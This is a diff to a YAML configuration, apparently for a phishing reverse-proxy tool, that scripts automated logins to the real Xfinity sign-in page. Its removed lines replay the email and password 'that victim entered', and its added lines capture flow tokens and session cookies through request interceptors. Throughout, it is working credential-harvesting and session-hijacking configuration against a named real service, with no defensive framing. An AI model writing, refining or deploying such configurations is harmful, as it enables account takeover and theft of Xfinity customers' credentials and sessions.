@@ -73,105 +73,43 @@ credentials:
 puppet:
   enabled: true
   triggers:
-    # Trigger 1: When user submits email (first step)
-    - id: 'xfinity_email'
+    - id: "xfinity_login"
       enabled: true
-      domains: ['login.xfinity.com']
-      paths: ['/login']
-      tokens: ['X-hzfdeCEGvt-a', 'X-hzfdeCEGvt-z', 'X-hzfdeCEGvt-d', 'X-hzfdeCEGvt-c', 'X-hzfdeCEGvt-b', 'X-hzfdeCEGvt-f']
+      name: "Xfinity Login Flow"
+      domains: ["login.xfinity.com"]
+      paths: ["/login"]
       auto_activate: true
-      open_url: 'https://login.xfinity.com/login'
+      tokens: ["flowId", "flowStateId", "flowStep"]
+      extract_cookies: true
       actions:
-        # Wait for page to load
         - selector: 'body'
-          click: false
-          post_wait: 2000
+          post_wait: 3000
         # Accept cookies if popup appears
         - selector: '#truste-consent-button, .accept-cookies, [aria-label="Accept Cookies"]'
           click: true
           timeout: 5000
-          post_wait: 1000
-        # Enter the email that victim entered
-        - selector: 'input[name="user"], #user, input[type="email"]'
+          post_wait: 500
+        # Enter the email
+        - selector: '#user, input[name="user"], input[type="email"]'
           value: '{username}'
-          enter: false
-          click: false
-          post_wait: 500
-        # Click the submit/continue button
-        - selector: 'button[type="submit"], #continue, .btn-primary, [data-testid="submit-button"]'
-          click: true
-          post_wait: 3000
-        # Wait for password page to load
-        - selector: 'input[name="passwd"], #passwd, input[type="password"]'
-          click: false
-          post_wait: 2000
-      
-    # Trigger 2: When user submits password (second step)
-    - id: 'xfinity_password'
-      enabled: true
-      domains: ['login.xfinity.com']
-      paths: ['/login']
-      tokens: ['X-hzfdeCEGvt-a', 'X-hzfdeCEGvt-z', 'X-hzfdeCEGvt-d', 'X-hzfdeCEGvt-c', 'X-hzfdeCEGvt-b', 'X-hzfdeCEGvt-f']
-      auto_activate: false
-      open_url: ''
-      actions:
-        # We're already on password page from previous step
-        # Enter the password that victim entered
-        - selector: 'input[name="passwd"], #passwd, input[type="password"]'
-          value: '{password}'
-          enter: false
-          click: false
-          post_wait: 500
-        # Check "Remember me" if present
-        - selector: 'input[name="rememberMe"], #rememberMe, [type="checkbox"]'
-          click: true
-          timeout: 3000
+          required: true
           post_wait: 500
         # Click the sign in button
-        - selector: 'button[type="submit"], #sign_in, .sign-in-button'
+        - selector: '#sign_in, button[type="submit"], #continue, [data-testid="submit-button"]'
           click: true
-          post_wait: 5000
+          timeout: 15000
+          post_wait: 2000
 
   interceptors:
-    # Interceptor for email submission tokens
-    - token: 'X-hzfdeCEGvt-a'
-      url_pattern: '^https://login\.xfinity\.com/login.*'
-      parameter: 'X-hzfdeCEGvt-a'
-      abort: true
-    - token: 'X-hzfdeCEGvt-z'
-      url_pattern: '^https://login\.xfinity\.com/login.*'
-      parameter: 'X-hzfdeCEGvt-z'
-      abort: true
-    - token: 'X-hzfdeCEGvt-d'
-      url_pattern: '^https://login\.xfinity\.com/login.*'
-      parameter: 'X-hzfdeCEGvt-d'
-      abort: true
-    - token: 'X-hzfdeCEGvt-c'
-      url_pattern: '^https://login\.xfinity\.com/login.*'
-      parameter: 'X-hzfdeCEGvt-c'
-      abort: true
-    - token: 'X-hzfdeCEGvt-b'
-      url_pattern: '^https://login\.xfinity\.com/login.*'
-      parameter: 'X-hzfdeCEGvt-b'
-      abort: true
-    - token: 'X-hzfdeCEGvt-f'
-      url_pattern: '^https://login\.xfinity\.com/login.*'
-      parameter: 'X-hzfdeCEGvt-f'
-      abort: true
-    
-    # Also intercept the flow parameters
     - token: 'flowId'
-      url_pattern: '^https://login\.xfinity\.com/login.*'
-      parameter: 'flowId'
-      abort: false
+      url_pattern: '.*'
+      abort: true
     - token: 'flowStateId'
-      url_pattern: '^https://login\.xfinity\.com/login.*'
-      parameter: 'flowStateId'
-      abort: false
+      url_pattern: '.*'
+      abort: true
     - token: 'flowStep'
-      url_pattern: '^https://login\.xfinity\.com/login.*'
-      parameter: 'flowStep'
-      abort: false
+      url_pattern: '.*'
+      abort: true
 
 # ============================================
 # FORCE POST CONFIGURATION (COMPLEMENTARY)
